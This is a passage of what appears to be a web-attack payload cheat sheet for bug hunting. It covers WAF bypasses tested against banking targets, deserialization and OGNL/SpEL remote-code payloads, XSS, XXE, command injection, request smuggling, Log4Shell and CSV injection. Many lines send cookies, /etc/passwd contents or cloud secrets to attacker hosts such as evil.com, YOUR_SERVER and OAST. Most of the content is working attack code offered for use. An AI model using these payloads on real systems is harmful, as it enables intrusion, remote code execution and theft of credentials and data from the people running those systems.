| Handlebars    | `{{7*7}}`               | Same as Twig/Jinja                          |

Important: most of these contain `{`/`<` chars that confuse Tomcat's URL parser if sent raw. URL-encode them before sending; F5 still doesn't catch the encoded form.

### 7. Unicode fullwidth dollar `＄` (U+FF04)

Send as raw UTF-8 bytes (`\xef\xbc\x84`). F5 sees the byte sequence, doesn't decode it as `$`, the rule misses. Backend Java apps with NFKC normalization will reconstruct `${...}` server-side.

```http
GET /target/endpoint?q=＄{7*7} HTTP/1.1
```

(That `＄` is U+FF04, copy-paste, not a regular `$`.)

### What F5 still catches (verified blocked across all attempts)

- Standard `${...}` in any URL position (path, query, matrix params)
- URL-encoded `%24%7B...%7D` in query
- Double-URL-encoded `%2524%257B...%257D`
- Whitespace inside braces (`${ 7*7 }`)
- Zero-width characters between `$` and `{`: NUL `\x00`, ZWSP `​`, ZWJ `‍`, RLO `‮`, BOM `﻿`, soft hyphen `\xAD`, tab, CR
- Path-based `${...}`: `/api/${7*7}`, `/api/v1/${7*7}`
- Matrix-param `${...}`: `/path;${7*7}`, `/path;jsessionid=${7*7}`
- HTML-entity-without-URL-encoding: `${&#55;&#42;&#55;}` (still has literal `${`)
- Backslash escape: `$\\{7*7\\}`

### Practical exploitation flow

1. Identify a target reachable behind F5 BIG-IP ASM (look for `Set-Cookie: TS01...` or `lb-N-p-NNN` cookies, or HTTP 200 with body length 101 and "Request Rejected" title on payload submission).
2. Confirm F5 is in front (not just an LB): send `?q=${7*7}` and look for the soft-block 101-byte response.
3. Pick the bypass primitive that matches the target's request-handling:
   - Backend uses Spring with JSON DTOs → use **JSON Content-Type smuggling (#1)**
   - Backend uses old IIS / .NET → try **`%u` encoding (#3)**
   - Backend Java app with input normalization → try **fullwidth `＄` (#7)** or **UTF-7 (#2)**
   - Backend has logged-User-Agent reflection → use **header smuggling (#5)**
   - Target has known SSTI sink in Twig/Velocity/Razor/ERB → use **alternative engine syntax (#6)**
4. Stack with downstream sink: bypass-primitive needs to land on an actual templating engine, log injector, or reflection point. Bypass alone is informational; bypass + sink = paid finding.

### Akamai (Kona + Bot Manager) — what was NOT bypassed

For comparison, **none** of the request-side techniques bypassed Akamai on banking targets in 2026:
- TLS fingerprint matching via `curl_cffi` impersonating Chrome 116/120/131, Edge 101, Firefox 133, Safari iOS 17 → all returned `Access Denied` (`errors.edgesuite.net` ref). Akamai blocks via **IP reputation**, not TLS.
- Real Firefox via `camoufox` stealth browser → also `Access Denied`. Sensor JS (`_abck` cookie) never issued.
- Pragma debug headers (`akamai-x-cache-on, akamai-x-get-cache-key, akamai-x-get-true-cache-key, akamai-x-feo-trace`) → no debug info leaked, all hosts still 403.
- `True-Client-IP` / `X-Forwarded-For` / `X-Real-IP` geo spoofing → no change.

Akamai bypass requires **residential proxy** or **clean source IP** that's not flagged on the target's threat-intelligence feed. CVE-2026-26365 (Connection: Transfer-Encoding) and CVE-2025-66373 (chunk encoding) were patched globally Feb/Nov 2025; verify they're still vulnerable on a specific target before relying on them.

## Deserialization

### Python Pickle
```python
import pickle, base64, os
class RCE:
    def __reduce__(self):
        return (os.system, ('cat /flag',))
base64.b64encode(pickle.dumps(RCE()))
```

### PHP Unserialize
```php
O:8:"ClassName":1:{s:4:"prop";s:6:"system";}
# If __destruct or __wakeup calls user-controlled method
```

### Java
```bash
# Generate with ysoserial
java -jar ysoserial.jar CommonsCollections1 'id' | base64
```

### Node.js node-serialize
```javascript
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}
```

## JWT Attacks

### alg:none
```
# Header: {"alg":"none","typ":"JWT"}
# Base64: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
# Payload: eyJ1c2VyIjoiYWRtaW4ifQ
# Signature: (empty)
# Token: header.payload.
```

### RS256→HS256 Key Confusion
```bash
# Use the PUBLIC key as HMAC secret (sign with RS256 public key as HS256)
python3 -c "
import jwt
public_key = open('public.pem').read()
token = jwt.encode({'user':'admin'}, public_key, algorithm='HS256')
print(token)
"
```

### Weak Secret Brute Force
```bash
hashcat -a 0 -m 16500 jwt.txt wordlist.txt
# Or: jwt-cracker <token> -d 6  # brute force up to 6 chars
```

## LFI / Path Traversal

### PHP Wrappers
```
php://filter/convert.base64-encode/resource=index.php
php://input  (POST body as code)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
expect://id
```

### Log Poisoning → RCE
```bash
# 1. Inject PHP in User-Agent header
curl -H "User-Agent: <?php system(\$_GET['c']); ?>" https://target/
# 2. Include the log file
curl "https://target/page?file=../../../../var/log/apache2/access.log&c=id"
```

### Bypass Filters
```
../ → ....// (recursive strip)
../ → ..%2f → %2e%2e%2f → %2e%2e/
../ → ..;/ (Tomcat/Spring)
```

## Prototype Pollution (Node.js)

### Detection
```json
{"__proto__": {"polluted": true}}
{"constructor": {"prototype": {"polluted": true}}}
```

### Escalation to RCE
```json
// If target uses child_process.fork/spawn with shell:true
{"__proto__": {"shell": "/proc/self/exe", "NODE_OPTIONS": "--require /proc/self/environ"}}
// Or via EJS template:
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');//"}}
```

## NoSQL Injection (MongoDB)

### Auth Bypass
```json
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}
```

### Data Extraction
```json
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^ab"}}
// Iterate character by character
```

## DeFi / Smart Contract Attacks

### Reentrancy
```solidity
// Attack contract calls back into vulnerable withdraw before balance update
receive() external payable {
    if (address(target).balance >= amount) {
        target.withdraw(amount);
    }
}
```

### Flash Loan Pattern
```solidity
function attack() external {
    flashLoanProvider.borrow(1000000 ether, address(this));
}
function executeOperation(uint amount) external {
    target.swap(amount);    // Manipulate price
    target.arbitrage();     // Profit
    token.transfer(msg.sender, amount + fee);  // Repay
}
```

### Oracle Manipulation
```solidity
// If oracle uses spot price from AMM:
// 1. Flash borrow large amount
// 2. Swap to move price
// 3. Interact with protocol at manipulated price
// 4. Swap back and repay
```

## GraphQL Alias Batching (Rate Limit Bypass)

```graphql
# 10 OTP attempts in 1 request:
mutation BatchBrute {
  a1: verifyOtp(token: "000001") { success }
  a2: verifyOtp(token: "000002") { success }
  a3: verifyOtp(token: "000003") { success }
  a4: verifyOtp(token: "000004") { success }
  a5: verifyOtp(token: "000005") { success }
  a6: verifyOtp(token: "000006") { success }
  a7: verifyOtp(token: "000007") { success }
  a8: verifyOtp(token: "000008") { success }
  a9: verifyOtp(token: "000009") { success }
  a10: verifyOtp(token: "000010") { success }
}

# 10 login attempts in 1 request:
mutation BatchLogin {
  a1: login(username: "admin", password: "pass1") { token }
  a2: login(username: "admin", password: "pass2") { token }
  a3: login(username: "admin", password: "pass3") { token }
}
```

## GraphQL Auth Bypass Testing

```bash
# Test mutation without auth:
curl -X POST target/graphql -H "Content-Type: application/json" \
  -d '{"query":"mutation { logout(userName: \"admin\") { success } }"}'

# Test with fake auth (should get same response if no middleware):
curl -X POST target/graphql -H "Content-Type: application/json" \
  -H "Authorization: Bearer invalidtoken123" \
  -d '{"query":"mutation { logout(userName: \"admin\") { success } }"}'

# Clairvoyance (schema recon without introspection):
curl -X POST target/graphql -H "Content-Type: application/json" \
  -d '{"query":"{ usr }"}'
# Response: "Did you mean \"user\"?"
```

## SAML Payloads

```bash
# SAML signing oracle test:
curl -X POST 'https://target.com/saml/sso' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'status={"primaryCode":"urn:oasis:names:tc:SAML:2.0:status:Success"}'

# Empty body (trigger stack trace):
curl -X POST 'https://target.com/saml/sso' \
  -H 'Content-Type: application/x-www-form-urlencoded' -d ''

# SAML ACS endpoint test:
curl -X POST 'https://target.com/_hcms/mem/saml/acs' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "SAMLResponse=<base64-encoded-assertion>"
```

## gRPC Method Enumeration

```bash
# Enumerate gRPC methods via Envoy error messages:
for resource in accounts users orders holdings portfolios wallets transactions currencies; do
  echo -n "$resource: "
  curl -s "https://target.com/v1/${resource}/" | grep -oP 'method = /[^"]+' || echo "no leak"
done

# Test non-v1 paths (may bypass RBAC):
for resource in accounts users orders holdings; do
  echo -n "non-v1 $resource: "
  curl -s -o /dev/null -w "%{http_code}" "https://target.com/${resource}/"
done
```

## OAuth Code Leakage Detection

```bash
# Check for analytics on callback page:
curl -s "https://target.com/callback?code=test&state=test" | \
  grep -oiE 'gtag|G-[A-Z0-9]+|ga4|logrocket|lrkt|segment|amplitude|mixpanel|heap' | sort -u

# PKCE enforcement check:
curl -X POST "https://auth.target.com/token" \
  -d "grant_type=authorization_code&code=fake&client_id=CLIENT_ID&redirect_uri=REDIRECT"
# invalid_grant = PKCE NOT enforced
# invalid_request = PKCE enforced

# Public client check:
curl -X POST "https://auth.target.com/token" \
  -d "grant_type=authorization_code&code=fake&client_id=CLIENT_ID"
# invalid_grant = public client (no secret needed)
# invalid_client = confidential client
```

## XSS WAF-Specific Bypass Payloads

```html
<!-- CloudFlare -->
<svg onload=alert&#0000000040document.cookie)>
<svg/oNLY%3d1/**/On+ONLoaD%3dco\u006efirm%26%23x28%3b%26%23x29%3b>
<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NLZCA6KQ=="))>

<!-- CloudFront -->
<details/open/ontoggle=confirm('XSS')>
">%0D%0A%0D%0A<x '="foo"><x foo='><img src=x onerror=javascript:alert(1)//>

<!-- ModSecurity -->
<svg onload='new Function*["Y000!"].find(al\u0065rt)*'>

<!-- Imperva -->
<details x=xxxxxxxx 2 Open ontoggle=k&#x0000000000061;alert&#x000000028;origin&#x000029;>

<!-- Shadow DOM isolation (evades DOM scanners) -->
<div id="x"><script>
document.getElementById('x').attachShadow({mode:'closed'}).innerHTML=
'<img src=x onerror=fetch("https://YOUR_SERVER/?c="+document.cookie)>';
</script></div>

<!-- dialog vector (less filtered than script/img) -->
<dialog open onclose="fetch('https://YOUR_SERVER/?c='+document.cookie)">

<!-- Comment injection bypass -->
e/**/v/**/a/**/l(document./**/cookie)

<!-- Generic context-breaker pre-payloads (common in disclosed-report PoCs) -->
6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/
;window/*aabb*/['al'%2b'ert'](document./*aabb*/Location);
"><A%20%252F=""Href=%20JavaScript:k=%27a%27,top[k%2B%27lert%27](origin)>
<dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
`'";//><img/src=x onError="${x};alert(`1`);">
`'";//><Img Src=a OnError=location=src>
`'";//></h1><Svg+Only%3d1+OnLoad%3dconfirm(atob("WW91IGhhdmUgYmVlbiBoYWNrZWQgYnkgb3R0ZXJseSE%3d"))>

<!-- "alert" string blocked, base-30 numeric encode -->
<img src=x onerror=top[8680439..toString(30)](1)>

<!-- Constructor-chain reach when "alert" string filtered -->
<svg onload="new Function`["Y000!"].find(alert)`">
<img/src=x/onerror=this[location.hash.slice(1)](1)>

<!-- Bypass when on*= attributes are filtered, but javascript: URL is allowed -->
<form><isindex formaction="javascript&colon;confirm(1)">
<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'

<!-- Quote-mark differential — backtick-only execution -->
<img src ?itworksonchrome?\/onerror = alert(1)
<script itworksinallbrowsers>/*<script* */alert(1)</script
```

## XSS Stored — Underhunted Surfaces

Stored XSS pays more than reflected. These render contexts are commonly missed
by automated scanners and overlooked by hunters:

```
filenames                    — uploaded file's name reflected in download/list view
EXIF metadata                — image Title/Author/Comment/UserComment fields
SVG metadata                 — <title>, <desc>, <metadata> inside an SVG upload
PDF metadata                 — Title, Author, Subject, Keywords (via exiftool/pdftk)
Office docs                  — DOCX core.xml dc:creator/dc:title
support tickets              — admin/agent dashboard renders user-submitted text
audit logs / event history   — admin views often render raw input as "what user did"
notification emails          — server renders user input into outbound HTML
push notifications           — title/body shown by OS, sometimes by web app preview
display name / username      — header bar, mention autocomplete, @-suggestion list
profile bio / company name   — appears on cards, hover popovers, mention previews
billing fields               — invoice/receipt PDF + admin order detail page
group/team/org names         — sidebar, breadcrumbs, breadcrumb tooltip
markdown previews            — `![x](javascript:alert(1))`, `<img src=x onerror=...>` if HTML allowed
chat/comment quote-replies   — embedded "quoting" of prior message renders raw
file-version comments        — many SaaS products render plaintext as HTML on hover
admin-impersonation views    — superuser "view as user" pages re-render user data
mobile push deep-link params — saved param later opens in WebView with HTML render
```

For each surface above: submit a benign canary first, then locate every place
that canary appears (list view, detail view, admin panel, email, notification,
PDF, mobile deep link). Privileged-viewer renders (admin / support / auditor)
convert low-risk stored XSS into high severity.

## DOM XSS Sources and Sinks

```
Sources (where input enters):
  document.url, document.documentURI, document.baseURI, document.referrer
  location, location.href, location.search, location.hash, location.pathname
  window.name, window.referrer

Sinks (where input executes):
  element.innerHTML, element.outerHTML
  eval(), setTimeout(), setInterval()
  document.write(), document.writeln()
  jQuery: $(), .html(), .append()
  Angular: bypassSecurityTrustHtml()
  React: dangerouslySetInnerHTML
```

## XXE Advanced Payloads

```xml
<!-- Basic file read -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<test>&xxe;</test>

<!-- Blind XXE via OOB (parameter entity) -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://YOUR_SERVER/evil.dtd"> %xxe;]>
<test></test>

<!-- evil.dtd hosted on YOUR_SERVER: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://YOUR_SERVER/?p=%file;'>">
%eval;
%exfiltrate;

<!-- Error-based exfiltration (no OOB needed) -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///null/%file;'>">
%eval;
%error;

<!-- XInclude (when you can't control DOCTYPE) -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>

<!-- File upload XXE via SVG -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg xmlns="http://www.w3.org/2000/svg">
<text font-size="16" x="0" y="16">&xxe;</text></svg>

<!-- XXE via DOCX/XLSX (modify [Content_Types].xml inside the zip) -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>

<!-- Local DTD repurposing (when OOB is blocked) -->
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///null/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

## XSS Recon One-Liners

```bash
# URLs with parameters (XSS candidates):
echo "target.com" | gau | grep "=" | uro | tee param_urls.txt

# XSS-specific filtered URLs:
echo "target.com" | gau | gf xss | uro | tee xss_candidates.txt

# Full pipeline with reflection checking:
echo "target.com" | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt

# Instant reflection test:
echo "target.com" | gau | grep '=' | qsreplace '"><script>alert(1)</script>' | \
  while read host; do curl -s --path-as-is --insecure "$host" | \
  grep -qs "<script>alert(1)</script>" && echo "VULN: $host"; done

# JS variable extraction (hidden XSS vectors):
echo "target.com" | gau | egrep -i "\.js$" | egrep -v "\.json" | \
  while read url; do curl -s "$url" | grep -Eo "var [a-zA-Z0-9_]+" | \
  sed "s/var /${url}?/g"; done

# Subdomains + params combo:
subfinder -d target.com -silent | gau | grep "=" | uro | tee full_surface.txt
```

---

## Command Injection

### Linux separators & chaining
```
;id
|id
||id
&&id
`id`
$(id)
%0aid
%0did
%26%26id
%7Cid
{id,}
{echo,test}
$IFS$9id
$IFS;id
X=$'id';$X
```

### Windows
```
&whoami
|whoami
||whoami
&&whoami
%0awhoami
^whoami
"&whoami&"
"|whoami"
```

### Blind / time-based
```
;sleep 10
|sleep 10
`sleep 10`
$(sleep 10)
&ping -c 10 127.0.0.1
&&timeout /t 10
|nslookup $(whoami).oast.me
`curl oast.me/$(id|base64)`
```

### Out-of-band (OAST) exfil
```
;curl http://OAST/$(id|base64)
;wget -qO- $(hostname).OAST
;nslookup $(whoami).OAST
`dig $(id|base64|tr -d =).OAST`
;/bin/bash -c 'exec 3<>/dev/tcp/OAST/80;echo -e "GET /$(id|base64) HTTP/1.0\r\n\r\n" >&3'
```

### Filter bypasses (no space, no slash, no quotes)
```
cat</etc/passwd
{cat,/etc/passwd}
c"at" /et"c"/pa"sswd"
c\at /e\tc/pa\sswd
cat$IFS/etc/passwd
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd
xxd /etc/passwd|xxd -r
/???/??t /???/p??s??
$'\x63\x61\x74' /etc/passwd
base64 -d<<<Y2F0IC9ldGMvcGFzc3dk|sh
echo -e 'Y2F0IC9ldGMvcGFzc3dk'|base64 -d|sh
```

### Argument injection (curl, wget, ffmpeg, convert)
```
-oRCE.txt http://a
--upload-file /etc/passwd ftp://OAST
-F @/etc/passwd http://OAST
-K /dev/stdin   (curl reads config)
--use-askpass=/tmp/x  (wget)
-i concat:'|id'   (ffmpeg)
TEXT:'|id'   (ImageMagick convert)
```

### PoC
```bash
# Detect via time delay (safe canary)
time curl -s "https://t/ping?host=127.0.0.1%3Bsleep%2010"
# OOB
curl -s "https://t/ping?host=127.0.0.1%3Bcurl%20https://$(whoami).OAST"
```

---

## CORS Misconfiguration

### Test matrix
```
Origin: https://evil.com                      → reflected?
Origin: null                                  → ACAO: null + credentials?
Origin: https://target.com.evil.com           → suffix match flaw
Origin: https://evil.target.com               → wildcard-subdomain trust
Origin: https://evil-target.com               → regex missing anchor
Origin: https://target.com\.evil.com          → backslash parse confusion
Origin: https://target.com%60.evil.com        → backtick (Safari)
Origin: https://target.com.                   → trailing dot
Origin: https://target.com:443@evil.com       → userinfo confusion
Origin: https://xyztarget.com                 → prefix-match flaw
Origin: http://target.com                     → scheme downgrade
```

### One-liner enumerator
```bash
for o in https://evil.com null https://t.com.evil.com https://evil.t.com https://t.com.; do
  r=$(curl -sk -H "Origin: $o" -I "https://TARGET/api/me")
  echo "=== $o ==="; echo "$r" | grep -i '^access-control-'
done
```

### Credential-exfil PoC
```html
<!DOCTYPE html>
<html><body><script>
fetch('https://target.com/api/me',{credentials:'include'})
 .then(r=>r.text()).then(t=>fetch('https://evil.com/log?d='+btoa(t)));
</script></body></html>
```

### Null origin via sandboxed iframe
```html
<iframe sandbox="allow-scripts allow-top-navigation" srcdoc="
<script>
fetch('https://target.com/api/me',{credentials:'include'})
 .then(r=>r.text()).then(t=>top.location='https://evil.com/?d='+btoa(t));
</script>"></iframe>
```

### Pre-flight bypass
`text/plain`, `application/x-www-form-urlencoded`, `multipart/form-data` avoid pre-flight — test state change via POST with `Content-Type: text/plain`.

---

## CSRF

### Classic HTML form
```html
<form action="https://target.com/account/email" method="POST">
  <input name="email" value="attacker@evil.com">
  <input name="confirm" value="attacker@evil.com">
</form><script>document.forms[0].submit()</script>
```

### JSON endpoint via fetch
```html
<script>
fetch('https://target.com/api/email',{
  method:'POST',mode:'no-cors',credentials:'include',
  headers:{'Content-Type':'text/plain'},
  body:'{"email":"attacker@evil.com"}'
});
</script>
```

### JSON via form (text/plain trick)
```html
<form action="https://target.com/api/email" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","x":"' value='"}'>
</form><script>document.forms[0].submit()</script>
```

### Multipart smuggle
```html
<form action="https://target.com/api/email" method="POST" enctype="multipart/form-data">
  <input name='x" \r\nContent-Type: application/json\r\n\r\n{"email":"attacker@evil.com"}\r\n--x' value='x'>
</form>
```

### SameSite bypass patterns
- Lax default (≤2min after cookie set): top-level POST works — `<a target=_top>` + form.
- Lax allows top-level GET — state-changing GETs remain exploitable.
- Subdomain takeover + cookie scope `.target.com` → same-site again.
- Chrome "Lax+POST" 2-minute window.
- `SameSite=None` missing `Secure` → cookie dropped by modern browsers (detection, not exploit).

### Token validation flaws to probe
- Token accepted but not tied to session
- Omit token → still accepted
- Token reused across users
- `Origin`/`Referer` check only on `POST` — try `PUT`/`DELETE`/`PATCH`
- Token from cookie only (double-submit with predictable secret)

---

## Open Redirect

### Core payloads
```
//evil.com
///evil.com
////evil.com
/\/\evil.com
/\evil.com
https:evil.com
https:%5c%5cevil.com
//evil.com/%2e%2e
//evil.com%2F.target.com
//target.com@evil.com
//target.com%252F@evil.com
/%0d%0a/evil.com
/%09/evil.com
//evil.com%23.target.com
//evil.com%3f.target.com
//evil.com%2e
//evil%E3%80%82com        (ideographic full stop = .)
//evil%EF%BC%8Ecom        (fullwidth stop)
//xn--evil-xyz.com
javascript://target.com/%0aalert(1)
data:text/html,<script>location='https://evil.com'</script>
```

### Parameter fuzzlist
```
url, next, redirect, redirect_uri, redirect_url, return, return_to, returnTo,
returnUrl, rurl, dest, destination, continue, continueUrl, go, forward, target,
to, callback, callback_url, checkout_url, success_url, cancel_url, origin,
ref, referrer, image_url, jump, login_url, logout_url
```

### Allowlist-of-substrings bypass
```
https://evil.com/?target.com
https://evil.com#target.com
https://evil.com?x=target.com
https://target.com.evil.com
https://eviltarget.com
```

### OAuth chain
Open redirect on `redirect_uri` = token theft when `response_type=token` or authorization code with weak client-secret storage.

---

## Host Header Injection / Password-Reset Poisoning

```
Host: evil.com
Host: target.com:@evil.com
X-Forwarded-Host: evil.com
X-Host: evil.com
X-Forwarded-Server: evil.com
X-HTTP-Host-Override: evil.com
Forwarded: host=evil.com
X-Original-Host: evil.com

# Dual Host
Host: target.com
Host: evil.com

# Absolute URI in request line
GET https://evil.com/reset HTTP/1.1
Host: target.com
```

### Password-reset poisoning PoC
```bash
curl -s https://target.com/reset -d 'email=victim@x.com' \
  -H 'Host: evil.com' -H 'X-Forwarded-Host: evil.com'
# → reset email links to https://evil.com/reset?token=...
```

---

## HTTP Request Smuggling

### CL.TE
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

### TE.CL
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Host: target.com
Content-Length: 15

x=1
0

```

### TE.TE obfuscation
```
Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:chunked
Transfer-Encoding : chunked
Transfer-Encoding: "chunked"
Transfer-encoding: cow
 Transfer-Encoding: chunked
```

### H2.CL / H2.TE
H2 request with explicit `content-length` or `transfer-encoding` pseudoheader contradicting H2 framing — back-end H1 trusts smuggled header.

### CL.0
Front-end forwards CL bytes, back-end ignores body → body of request N prepends request N+1 on the keep-alive connection.

### Detection
- Time-based: partial chunked body causes back-end read timeout (~5–30 s).
- Differential: response status/length differs between CL-first and TE-first parsers.

### Impact patterns
- Bypass front-end auth/ACL (smuggle `GET /admin`)
- Queue poisoning — steal victim request headers / inject XSS
- Cache poisoning via smuggled `Host`

---

## Web Cache Poisoning & Deception

### Unkeyed header probe
```bash
for h in X-Forwarded-Host X-Forwarded-Scheme X-Forwarded-Proto X-Forwarded-For \
         X-Host X-Forwarded-Port X-Original-URL X-Rewrite-URL X-HTTP-Method-Override \
         X-Forwarded-Prefix X-Original-Host X-Forwarded-Server; do
  curl -sk -H "$h: evil.com" "https://target.com/?cb=$RANDOM" \
    -o /dev/null -w "$h %{http_code} %{size_download}\n"
done
```

### Cache deception variants
```
/account.css
/account/.css
/account;x=.css
/account%00.css
/account%23.css
/account%2f.css
/account?x=y.css
/account.js
/account.jpg
```

### Fat GET
```http
GET /home HTTP/1.1
Host: target.com
Content-Length: 55

search=<script>alert(1)</script>&utm=<img src=x onerror=alert(1)>
```

### Stored XSS via cache
Unkeyed header reflected in body → inject payload → cached response served to next visitor.

---

## Log4Shell / JNDI Injection

### Core payloads
```
${jndi:ldap://OAST/a}
${jndi:ldaps://OAST/a}
${jndi:rmi://OAST/a}
${jndi:dns://OAST/a}
${jndi:nis://OAST/a}
${jndi:iiop://OAST/a}
${jndi:corba://OAST/a}
${jndi:nds://OAST/a}
${jndi:http://OAST/a}
```

### Obfuscation bypasses
```
${${::-j}${::-n}${::-d}${::-i}:ldap://OAST/a}
${${lower:j}ndi:ldap://OAST/a}
${${upper:j}ndi:ldap://OAST/a}
${${lower:jn}${lower:di}:ldap://OAST/a}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//OAST/a}
${${date:'j'}ndi:ldap://OAST/a}
${${sys:java.version:jndi}:ldap://OAST/a}
${jndi:ldap://127.0.0.1#.OAST/a}
${jndi:${lower:l}${lower:d}ap://OAST/a}
```

### Common injection points
```
User-Agent: ${jndi:ldap://OAST/a}
X-Api-Version: ${jndi:ldap://OAST/a}
Referer: ${jndi:ldap://OAST/a}
X-Forwarded-For: ${jndi:ldap://OAST/a}
Cookie: session=${jndi:ldap://OAST/a}
Authorization: Bearer ${jndi:ldap://OAST/a}
Body fields: username, email, search, comment, name
```

### Exfil env vars via DNS
```
${jndi:ldap://${sys:user.name}.${env:AWS_SECRET_ACCESS_KEY}.OAST/a}
${jndi:dns://${env:DB_PASSWORD}.OAST}
```

### Detection one-liner
```bash
P='${jndi:ldap://CANARY.OAST/a}'
for h in User-Agent Referer X-Api-Version X-Forwarded-For; do
  curl -sk -H "$h: $P" "https://target.com/" -o /dev/null
done
```

---

## Expression Language Injection

### SpEL (Spring)
```
${7*7}
#{7*7}
${T(java.lang.Runtime).getRuntime().exec('id')}
${T(java.lang.Runtime).getRuntime().exec(new String[]{'/bin/sh','-c','id'})}
${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).next()}
${T(java.lang.System).getenv('AWS_SECRET_ACCESS_KEY')}
```

### OGNL (Struts / Confluence)
```
%{(#_='multipart/form-data').(#[email protected]@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
%{7*7}
${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(@java.lang.Runtime@getRuntime().exec('id'))}
```

### MVEL
```
$ {Runtime.getRuntime().exec("id")}
Runtime.getRuntime().exec("id")
```

### Thymeleaf
```
__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x
```

### Jinja2 / Twig see "SSTI" section in original payloads file — extend with:
```
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}
```

---

## LDAP Injection

### Auth bypass
```
*
*)(&
*))(|(cn=*
*)(uid=*))(|(uid=*
admin)(&))
admin))(|(password=*
admin*
admin*)((|userPassword=*)
*)(uid=*))(|(uid=*
*)(|(objectClass=*
```

### Blind boolean probes
```
user*)(userPassword=a*
user*)(userPassword=b*
...
```

### Extraction (character-by-character)
```bash
for c in {a..z} {0..9}; do
  r=$(curl -s -o /dev/null -w "%{size_download}" \
       "https://t/login?u=admin*)(description=${c}*&p=x")
  echo "$c $r"
done
```

---

## XPath Injection

### Auth bypass
```
' or '1'='1
' or 1=1 or ''='
admin' or '1'='1
' or name()='username' or 'a'='a
x'] | //* | a['
```

### Blind
```
' and substring(//user[1]/password,1,1)='a' and ''='
' and string-length(//user[1]/password)=8 and ''='
```

### XPath 2.0 OOB
```
' and doc(concat('http://OAST/',//user[1]/password))=0 and ''='
```

---

## CRLF / HTTP Header Injection

### Core payloads
```
%0d%0aSet-Cookie:%20role=admin
%0aSet-Cookie:%20role=admin
%0d%0aLocation:%20https://evil.com
%E5%98%8A%E5%98%8DSet-Cookie:%20role=admin   (UTF-8 overlong)
%0d%0a%0d%0a<script>alert(1)</script>
%u000d%u000aX-Injected: 1
\r\nX-Injected: 1
\n\rX-Injected: 1
```

### Reflect-in-redirect
```
/redirect?url=https://target.com%0d%0aSet-Cookie:%20session=HIJACKED
```

### Impact
- Session fixation via injected `Set-Cookie`
- XSS via injected body after `\r\n\r\n`
- Response splitting → cache poisoning
- SSRF header smuggling (`X-Forwarded-For` / auth headers to back end)

---

## CSV / Formula Injection

### Payloads
```
=1+1
=1+2";=1+2
@SUM(1+1)*cmd|' /C calc'!A0
=cmd|'/C calc'!A0
+cmd|'/C calc'!A0
-cmd|'/C calc'!A0
=HYPERLINK("http://evil.com?d="&A1,"Click")
=WEBSERVICE("http://evil.com/?d="&A1)
=IMPORTXML("http://evil.com","//a")
=IMPORTDATA("http://evil.com/?d="&A1)
=DDE("cmd";"/C calc";"__DdeLink_60_870516294")
```

### DDE-in-CSV (Excel)
```
